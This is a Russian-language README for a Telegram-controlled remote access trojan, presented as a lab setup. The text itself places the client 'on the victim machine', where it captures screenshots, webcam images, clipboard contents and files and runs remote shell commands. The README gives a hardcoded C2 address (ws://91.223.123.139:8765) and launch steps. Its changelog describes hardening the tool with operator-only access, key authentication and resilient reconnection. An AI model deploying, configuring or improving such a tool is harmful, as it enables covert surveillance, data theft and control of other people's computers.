# Актуальная рабочая пара (лаборатория)

Скопировано 2026-09-21 из соседних папок репозитория, оригиналы не тронуты.

| Файл здесь            | Откуда взят                    | Коммит          |
|-----------------------|--------------------------------|-----------------|
| `server.py`           | `server_new/server_tg12.py`    | 2026-04-13 22:40 (6b7bf7e) |
| `client.py`           | `client/client_term9.py`       | 2026-04-12 15:03 (eef49cf) |
| `requirements.txt`    | `server/requirements.txt`      | — |

## Почему именно эта пара

Протокол совпадает полностью. Клиент шлёт `sys_info, info, audio_list,
screenshot_result, webcam_result, shell_result, file_result` — сервер обрабатывает
все эти типы и дополнительно принимает `clipboard_data` (это единственное отличие
`server_new/server_tg12.py` от `server/server_tg12.py`). Старые клиенты
(`rat/*`, `client_term6`, `skibidiprikoli/*`) шлют `screenshot`/`webcam` без
суффикса `_result` и с tg11/tg12 несовместимы.

Команды сервер→клиент: `screenshot, webcam, set_volume, play_audio,
minimize_all, close_all, list_audio, shell` — все обработаны в клиенте.

## Перед запуском

1. **`client.py`, строка 19:** `SERVER_URL = "ws://91.223.123.139:8765"` —
   заменить на адрес своей лаборатории, например `ws://127.0.0.1:8765`.
   Сервер слушает `0.0.0.0:8765`.
2. **`server.py`, строки 37–38:** вшит токен Telegram-бота и `ADMIN_CHAT_ID`.
   Токен лежит в git-истории, считается скомпрометированным — для лаборатории
   выпустить новый через @BotFather и revoke старый.
3. Зависимости: `pip install -r requirements.txt` (Linux: системный `wmctrl`
   для `minimize_all`/`close_all`; на Windows — `pywin32`).

## Запуск

```bash
.venv/bin/python server.py     # WS-сервер на :8765 + Telegram-бот
.venv/bin/python client.py     # на машине-жертве (стенде)
```

## Контроль доступа и аудит (добавлено 2026-09-21)

- **Один ID**: все message/callback_query роутера закрыты
  `AdminOnlyMiddleware` — события от любого ID кроме `ADMIN_CHAT_ID`
  отклоняются и пишутся в аудит как `tg_access_denied`. Раньше
  `cmd_start`/`cb_shell_start` переназначали `last_admin_id` до проверки —
  посторонний мог перехватить вывод shell и файлы; исправлено.
- **Журнал аудита**: `audit.jsonl` рядом с `server.py` (JSON Lines, дописывается).
  События: `ws_connect`/`ws_disconnect`/`ws_evict`/`ws_error` (каждое
  подключение с адресом), `client_registered` (sys_info), `command_sent`
  (полный payload команды, включая текст shell), `shell_result` (вывод до
  2000 символов), `file_result`, `screenshot_result`, `webcam_result`,
  `clipboard_data`, `audio_list`, `client_info`, `shell_mode_entered`,
  `tg_access_denied`. Просмотр: `cat audit.jsonl | jq` (или `jq -c` построчно).
- Гонка при eviction исправлена: `finally` удаляет запись только если в ней
  всё ещё этот сокет.
- **Аутентификация WebSocket (Pre-Shared Key)**: подключение требует валидного
  токена `auth_token` (переменная окружения `AUTH_TOKEN` / `REMOTE_AUTH_TOKEN`).
  Неавторизованные соединения отклоняются с кодом 1008, предотвращая DoS выселения.
- **Защита от Path Traversal**: команда `copy <файл>` валидирует пути, предотвращает
  чтение критических системных файлов (`/etc/shadow`, `/etc/sudoers`), блокирует
  виртуальные файловые системы (`/dev`, `/proc`, `/sys`) и проверяет `ALLOWED_BASE_DIR`.
- **Безопасная передача файлов**: потоковое чтение порциями по 64КБ с контролем
  лимита памяти (до 50МБ), а буфер сервера увеличен до 100МБ для передачи Base64.
- **Изоляция Telegram-бота**: `run_telegram_bot` защищен супервизором с экспоненциальным
  backoff — сбои опроса Telegram не приводят к падению процесса и WS-сервера.
- **Exponential Backoff & Full Jitter**: клиент использует адаптивное переподключение
  вместо статичного sleep.
- **Диспетчеры команд и структурированное логирование**: лестницы `if/elif` заменены
  на реестры `CommandDispatcher` и `MessageDispatcher`, вывод ведется через `logging`.

## Тест рукопожатия

`test_handshake.py` поднимает только WS-слой сервера (без Telegram) и запускает
настоящий `client.py` subprocess-ом.
Для полного набора проверок безопасности (аутентификация, DoS-выселение, traversal,
backoff, изоляция Telegram): `.venv/bin/python test_deep_verification.py`.

- РУКОПОЖАТИЕ (sys_info -> connected_clients): OK, client_id `robot@robot-X99`
- ПОЛНЫЙ ЦИКЛ (shell -> shell_result): OK
- АУДИТ (client_registered, command_sent, shell_result): OK

Запуск: `.venv/bin/python test_handshake.py`
Глубокие тесты: `.venv/bin/python test_deep_verification.py`

В `client.py` этой копии SERVER_URL настроен на `ws://127.0.0.1:8765`.
WS-сервер функционирует стабильно независимо от доступности Telegram-бота.

## Прочее

- `server/server_tg5 _fix.py` — единственная версия, которая не компилируется
  (`SyntaxError: '(' was never closed`), в пару не входит.
- `rat/client_win.py` — Windows-клиент, но старого протокола (`screenshot`
  без `_result`), с этим сервером работать не будет.
